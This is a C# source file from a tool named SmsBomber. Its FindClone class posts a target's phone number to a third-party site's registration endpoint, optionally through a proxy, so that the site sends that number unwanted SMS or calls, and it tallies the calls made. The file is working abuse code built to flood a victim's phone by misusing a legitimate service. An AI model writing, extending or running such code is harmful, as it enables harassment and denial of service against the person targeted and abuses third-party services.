using Leaf.xNet;
using static SmsBomber.ReturnTypes;

namespace SmsBomber.SmsService.Sites
{
    internal class FindClone
    {
        public static ResponseSendSms Call()
        {
            using (var request = new HttpRequest())
            {
                if (!string.IsNullOrWhiteSpace(Globals.WorkingData.ProxyAdress)) { request.Proxy = ProxyClient.Parse(Globals.WorkingData.ProxyTypeLeaf, Globals.WorkingData.ProxyAdress); }
                try
                {
                    request.Post($"{DomainList.FindClone}/register?phone=+{Globals.WorkingData.PhoneNumber}").ToString();
                }
                catch
                {
                    return new ResponseSendSms { FailedConnected = !request.HttpIsConnected(), SuccessSend = false };
                }
                Globals.WorkingStats.CountMadeCalls++;
                return new ResponseSendSms { SuccessSend = true };
            }
        }
    }
}
